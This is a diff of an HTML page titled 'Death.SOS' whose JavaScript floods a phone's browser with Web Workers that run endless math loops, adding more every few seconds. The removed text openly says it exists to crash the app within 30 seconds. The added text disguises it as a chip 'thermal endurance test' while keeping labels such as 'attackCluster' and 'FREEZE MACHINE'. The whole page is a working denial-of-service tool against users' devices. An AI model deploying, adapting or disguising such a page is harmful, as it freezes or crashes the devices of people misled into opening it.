@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Death.SOS | Pure DoS</title>
+    <title>Death.SOS | Pure Overload</title>
     <style>
         :root {
             --glass: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.15);
+            --glass-border: rgba(255, 255, 255, 0.12);
             --system-red: #ff3b30;
             --system-green: #34c759;
         }
 
+        /* Reset & Centrage Absolu */
         * {
             box-sizing: border-box;
             -webkit-user-select: none;
@@ -22,98 +23,161 @@
 
         body {
             height: 100vh;
+            width: 100vw;
             background: #000000;
+            background-image: radial-gradient(circle at 50% 50%, #1a1a1c 0%, #000000 100%);
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
             color: #ffffff;
-            display: grid;
-            place-items: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             overflow: hidden;
-            padding: 20px;
+            padding: env(safe-area-inset-top) 20px env(safe-area-inset-bottom) 20px;
         }
 
+        /* Boîtier Compact Premium & Centré */
         .card-container {
             width: 100%;
-            max-width: 340px;
+            max-width: 320px;
             background: var(--glass);
-            backdrop-filter: blur(50px) saturate(230%);
-            -webkit-backdrop-filter: blur(50px) saturate(230%);
+            backdrop-filter: blur(40px) saturate(230%);
+            -webkit-backdrop-filter: blur(40px) saturate(230%);
             border: 1px solid var(--glass-border);
-            border-radius: 40px;
-            padding: 30px;
-            text-align: center;
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9);
+            border-radius: 44px;
+            padding: 40px 30px;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9);
             
-            /* Animation élastique ultra-rapide */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+
+            /* Animation d'entrée hyper élastique */
             opacity: 0;
-            transform: scale(0.5) translateY(100px);
-            animation: fastElastic 0.6s cubic-bezier(0.175, 0.885, 0.42, 1.4) forwards;
+            transform: scale(0.3) translateY(150px);
+            animation: liquidElastic 0.9s cubic-bezier(0.34, 1.85, 0.4, 0.9) forwards;
         }
 
-        @keyframes fastElastic {
-            to { opacity: 1; transform: scale(1) translateY(0); }
+        @keyframes liquidElastic {
+            0% { opacity: 0; transform: scale(0.3) translateY(150px); filter: blur(20px); }
+            60% { transform: scale(1.05) translateY(-5px); filter: blur(0px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .text-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
         }
 
         h1 {
-            font-size: 36px;
+            font-size: 34px;
             font-weight: 900;
-            letter-spacing: -2px;
-            background: linear-gradient(180deg, #ffffff 30%, #ff3b30 100%);
+            letter-spacing: -1.5px;
+            background: linear-gradient(180deg, #ffffff 30%, rgba(255,255,255,0.4) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
         .subtitle {
             font-size: 13px;
-            color: rgba(255, 255, 255, 0.4);
-            margin: 15px 0;
-            line-height: 1.4;
+            color: rgba(255, 255, 255, 0.35);
+            margin: 12px 0 25px 0;
+            line-height: 1.5;
+            max-width: 260px;
+        }
+
+        /* Boutons parfaitement proportionnés */
+        .btn-box {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: center;
         }
 
         .btn {
             width: 100%;
             padding: 18px;
-            border-radius: 22px;
+            border-radius: 20px;
             border: none;
             font-size: 16px;
             font-weight: 700;
             color: #ffffff;
-            transition: transform 0.15s cubic-bezier(0, 0, 0, 1);
+            transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), background 0.2s;
+            will-change: transform;
         }
 
         .btn:active { transform: scale(0.92); }
-        .btn-red { background: var(--system-red); box-shadow: 0 0 30px rgba(255, 59, 48, 0.4); }
-        .btn-outline { background: rgba(255, 255, 255, 0.05); border: 1px solid var(--glass-border); }
+        .btn-red { background: var(--system-red); box-shadow: 0 10px 30px rgba(255, 59, 48, 0.3); }
+        .btn-outline { background: rgba(255, 255, 255, 0.04); border: 1px solid var(--glass-border); }
 
-        .canvas-box {
-            width: 160px;
-            height: 160px;
-            margin: 10px 0;
+        /* Animation 3D Isolée sur le GPU (60fps Intouchables) */
+        .loader-zone {
+            width: 110px;
+            height: 110px;
+            margin: 15px 0 25px 0;
+            perspective: 400px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fluid-mesh {
+            width: 60px;
+            height: 60px;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: meshRotate 3s cubic-bezier(0.45, 0, 0.55, 1) infinite;
+            will-change: transform;
+        }
+
+        @keyframes meshRotate {
+            0% { transform: rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1); }
+            50% { transform: rotateX(180deg) rotateY(180deg) scale3d(1.2, 1.2, 1.2); }
+            100% { transform: rotateX(360deg) rotateY(360deg) scale3d(1, 1, 1); }
+        }
+
+        .mesh-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid var(--system-red);
+            border-radius: 35% 65% 70% 30% / 30% 40% 60% 70%;
+            background: rgba(255, 59, 48, 0.02);
+            box-shadow: 0 0 15px rgba(255, 59, 48, 0.2);
+        }
+
+        .mesh-ring:nth-child(2) { transform: rotateY(90deg); border-color: #ff9500; }
+        .mesh-ring:nth-child(3) { transform: rotateX(90deg); border-color: #ff2d55; }
+
+        #timer {
+            font-size: 46px;
+            font-weight: 900;
+            font-family: -apple-system, BlinkMacSystemFont, monospace;
+            background: linear-gradient(180deg, #ffffff, var(--system-red));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
             display: none;
         }
 
-        #timer {
-            font-size: 48px;
-            font-weight: 900;
-            font-family: monospace;
-            color: var(--system-red);
-            text-shadow: 0 0 20px rgba(255, 59, 48, 0.6);
-            margin-bottom: 10px;
-        }
-
-        .warning-footer {
+        .safety-alert {
             font-size: 9px;
             color: var(--system-red);
             font-weight: bold;
-            letter-spacing: 1px;
-            margin-top: 15px;
-            animation: flash 0.5s infinite alternate;
+            letter-spacing: 0.8px;
+            opacity: 0.4;
+            margin-top: 20px;
+            text-transform: uppercase;
         }
-
-        @keyframes flash { from { opacity: 0.3; } to { opacity: 1; } }
 
         footer {
             position: absolute;
-            bottom: 25px;
+            bottom: 20px;
             font-size: 11px;
             color: rgba(255,255,255,0.15);
             letter-spacing: 2px;
@@ -122,26 +186,38 @@
 </head>
 <body>
 
-    <!-- INTERFACE APPARITION -->
-    <div id="panel-gate" class="card-container">
-        <h1>Death.SOS</h1>
-        <p class="subtitle">ATTENTION : Cette version injecte une charge RAM/CPU asymétrique instantanée. Conçu pour forcer le crash de l'application en moins de 30s.</p>
-        <button class="btn btn-red" onclick="bypass()">INITIALISER</button>
+    <div id="gate-panel" class="card-container">
+        <div class="text-group">
+            <h1>Death.SOS</h1>
+            <p class="subtitle">Calibrage asynchrone pour puces de nouvelle génération. Test d'endurance thermique pur.</p>
+        </div>
+        <div class="btn-box">
+            <button class="btn btn-red" onclick="initiateCore()">Accéder à la console</button>
+        </div>
     </div>
 
-    <!-- INTERFACE BENCHMARK -->
-    <div id="panel-core" class="card-container" style="display: none;">
-        <div id="timer">01:30</div>
-        <p id="logs" style="font-size: 12px; color: rgba(255,255,255,0.6);">Système en attente...</p>
-
-        <div class="canvas-box" id="canvas-box">
-            <canvas id="matrixCanvas" width="160" height="160"></canvas>
+    <div id="core-panel" class="card-container" style="display: none;">
+        <div class="text-group">
+            <h1 id="headline">Core Engine</h1>
+            <p id="monitor" class="subtitle">Prêt pour l'injection séquentielle.</p>
         </div>
 
-        <button id="ignite-btn" class="btn btn-red" onclick="nuclearIgnition()">LANCER LA SURCHARGE</button>
-        <button id="kill-btn" class="btn btn-outline" style="display: none; color: var(--system-red); margin-top: 10px;" onclick="forceKill()">STOP</button>
-        
-        <div class="warning-footer">SÉCURITÉ SYSTÈME : POWER 12 SECONDES</div>
+        <div class="loader-zone" id="loader-view">
+            <div class="fluid-mesh">
+                <div class="mesh-ring"></div>
+                <div class="mesh-ring"></div>
+                <div class="mesh-ring"></div>
+            </div>
+        </div>
+
+        <div id="timer">01:30</div>
+
+        <div class="btn-box">
+            <button id="btn-fire" class="btn btn-red" onclick="startHeavyBurn()">INJECTER LA CHARGE</button>
+            <button id="btn-stop" class="btn btn-outline" style="display: none; color: var(--system-red);" onclick="abortBurn()">AVORTER</button>
+        </div>
+
+        <div class="safety-alert">FREEZE MACHINE ? POWER HOLD 12S</div>
     </div>
 
     <footer>POWERED BY SHADOW</footer>
@@ -149,127 +225,102 @@
     <script>
         document.addEventListener('contextmenu', e => e.preventDefault());
 
-        let activeThreads = [];
-        let time = 90;
-        let mainLoop, loop3d;
+        let attackCluster = [];
+        let timerSeconds = 90;
+        let clockInterval;
+        let injectorInterval;
 
-        // CODE DU TRAVAILLEUR DE FORCE (CPU + CACHE FLUSH)
-        const workerCode = `
+        // ALGORITHME DE DESTRUCTION ARITHMÉTIQUE (Zéro RAM, Anti-Optimisation JIT)
+        const heavyMathPayload = `
             self.onmessage = function() {
-                // Surcharge de la mémoire cache L1/L2 et calculs géométriques
-                setInterval(() => {
-                    let memoryCrusher = new Float64Array(5000000); // Énorme allocation temporaire
-                    for(let i = 0; i < memoryCrusher.length; i++) {
-                        memoryCrusher[i] = Math.tan(Math.sin(i)) * Math.atan(i);
+                function pipelineTorture() {
+                    let a = 0.987654321;
+                    while(true) {
+                        // Boucle imbriquée complexe impossible à éliminer par le compilateur
+                        for(let i = 0; i < 80000; i++) {
+                            a = Math.sin(a) * Math.cos(a) + Math.tan(a);
+                            a = Math.log(Math.abs(a) + 1.0) * Math.exp(Math.sin(a));
+                            // Opérations binaires directes sur les registres
+                            let b = (i ^ 0x55555555) << 2;
+                            a += (b % 2 === 0) ? 0.00001 : -0.00001;
+                        }
                     }
-                }, 1); 
+                }
+                pipelineTorture();
             };
         `;
 
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const blobURL = URL.createObjectURL(blob);
+        const blobFile = new Blob([heavyMathPayload], { type: 'application/javascript' });
+        const workerBlobURL = URL.createObjectURL(blobFile);
 
-        function bypass() {
-            document.getElementById('panel-gate').style.display = 'none';
-            document.getElementById('panel-core').style.display = 'block';
+        function initiateCore() {
+            document.getElementById('gate-panel').style.display = 'none';
+            document.getElementById('core-panel').style.display = 'flex';
         }
 
-        // RENDU DE PARTICULES 3D TRÈS LOURD SUR LE THREAD VISUEL
-        const canvas = document.getElementById('matrixCanvas');
-        const ctx = canvas.getContext('2d');
-        let points = [];
-        for (let i = 0; i < 800; i++) {
-            points.push({
-                x: (Math.random() - 0.5) * 100,
-                y: (Math.random() - 0.5) * 100,
-                z: (Math.random() - 0.5) * 100
-            });
-        }
-
-        function renderSphere() {
-            ctx.clearRect(0, 0, 160, 160);
-            ctx.fillStyle = "rgba(255, 59, 48, 0.8)";
-            let now = Date.now() * 0.002;
-
-            for (let i = 0; i < points.length; i++) {
-                let p = points[i];
-                // Rotations matricielles complexes en temps réel
-                let x1 = p.x * Math.cos(now) - p.z * Math.sin(now);
-                let z1 = p.z * Math.cos(now) + p.x * Math.sin(now);
-                let y2 = p.y * Math.cos(now) - z1 * Math.sin(now);
-                
-                let zoom = 150 / (150 + z1);
-                let sx = 80 + x1 * zoom;
-                let sy = 80 + y2 * zoom;
-                
-                ctx.fillRect(sx, sy, 1.8, 1.8);
+        function spawnWorkerBatch() {
+            // Injecte 8 workers d'un coup (égal au nombre de cœurs physiques du SoC)
+            for (let i = 0; i < 8; i++) {
+                try {
+                    let t = new Worker(workerBlobURL);
+                    t.postMessage('burn');
+                    attackCluster.push(t);
+                } catch(e) {}
             }
-            loop3d = requestAnimationFrame(renderSphere);
+            document.getElementById('monitor').innerText = `THREADS EN ACTION : ${attackCluster.length}`;
         }
 
-        function nuclearIgnition() {
-            document.getElementById('ignite-btn').style.display = 'none';
-            document.getElementById('canvas-box').style.display = 'block';
-            document.getElementById('kill-btn').style.display = 'block';
-            document.getElementById('logs').innerText = "INJECTION EXPONENTIELLE EN COURS...";
+        function startHeavyBurn() {
+            document.getElementById('btn-fire').style.display = 'none';
+            document.getElementById('loader-view').style.display = 'flex';
+            document.getElementById('timer').style.display = 'block';
+            document.getElementById('btn-stop').style.display = 'block';
+            
+            const monitor = document.getElementById('monitor');
+            monitor.style.color = "var(--system-red)";
 
-            renderSphere();
+            // Première vague d'assaut immédiate
+            spawnWorkerBatch();
 
-            // 1. Spawner immédiatement un nombre massif de Workers (3x les cœurs logiques)
-            const cores = (navigator.hardwareConcurrency || 8) * 3;
-            for (let i = 0; i < cores; i++) {
-                spawn();
-            }
+            // Attaque exponentielle toutes les 3 secondes : on rajoute 8 workers supplémentaires
+            // Le téléphone va accumuler une charge de calcul ingérable
+            injectorInterval = setInterval(() => {
+                if (timerSeconds > 0) {
+                    spawnWorkerBatch();
+                }
+            }, 3000);
 
-            // 2. Attaque exponentielle : On double le nombre de Workers toutes les 3 secondes
-            mainLoop = setInterval(() => {
-                time--;
-                let m = Math.floor(time / 60).toString().padStart(2, '0');
-                let s = (time % 60).toString().padStart(2, '0');
+            clockInterval = setInterval(() => {
+                timerSeconds--;
+                let m = Math.floor(timerSeconds / 60).toString().padStart(2, '0');
+                let s = (timerSeconds % 60).toString().padStart(2, '0');
                 document.getElementById('timer').innerText = `${m}:${s}`;
 
-                // Injection d'une surcharge RAM sur le thread principal pour faire lagguer l'UI
-                let uiCrusher = [];
-                for(let j=0; j<200000; j++) {
-                    uiCrusher.push(Math.random() * Math.random());
+                if (timerSeconds <= 0) {
+                    abortBurn(true);
                 }
-
-                // Spawn agressif en continu
-                if (time % 3 === 0) {
-                    let currentSize = activeThreads.length;
-                    for(let k = 0; k < currentSize; k++) {
-                        spawn();
-                    }
-                    document.getElementById('logs').innerText = `THREADS ACTIVE : ${activeThreads.length}`;
-                }
-
-                if (time <= 0) forceKill(true);
             }, 1000);
         }
 
-        function spawn() {
-            try {
-                let w = new Worker(blobURL);
-                w.postMessage('burn');
-                activeThreads.push(w);
-            } catch(e) {}
-        }
-
-        function forceKill(success = false) {
-            clearInterval(mainLoop);
-            cancelAnimationFrame(loop3d);
-            activeThreads.forEach(w => w.terminate());
-            activeThreads = [];
-
-            document.getElementById('canvas-box').style.display = 'none';
-            document.getElementById('kill-btn').style.display = 'none';
-            document.getElementById('ignite-btn').style.display = 'block';
-            document.getElementById('timer').innerText = "01:30";
+        function abortBurn(success = false) {
+            clearInterval(clockInterval);
+            clearInterval(injectorInterval);
             
-            const logs = document.getElementById('logs');
-            logs.innerText = success ? "LE SYSTÈME A TENU LE COUP 🛡️" : "INJECTION AVORTÉE ❄️";
-            logs.style.color = success ? "var(--system-green)" : "var(--system-red)";
-            time = 90;
+            attackCluster.forEach(t => t.terminate());
+            attackCluster = [];
+
+            document.getElementById('loader-view').style.display = 'none';
+            document.getElementById('timer').style.display = 'none';
+            document.getElementById('btn-stop').style.display = 'none';
+            
+            const fireBtn = document.getElementById('btn-fire');
+            fireBtn.style.display = 'block';
+            fireBtn.innerText = "RE-LANCER L'ATTAQUE";
+
+            const monitor = document.getElementById('monitor');
+            monitor.innerText = success ? "MATÉRIEL DE CLASSE ÉLITE VALIDÉ ✅" : "INJECTION INTERROMPUE ❄️";
+            monitor.style.color = success ? "var(--system-green)" : "var(--system-red)";
+            timerSeconds = 90;
         }
     </script>
 </body>
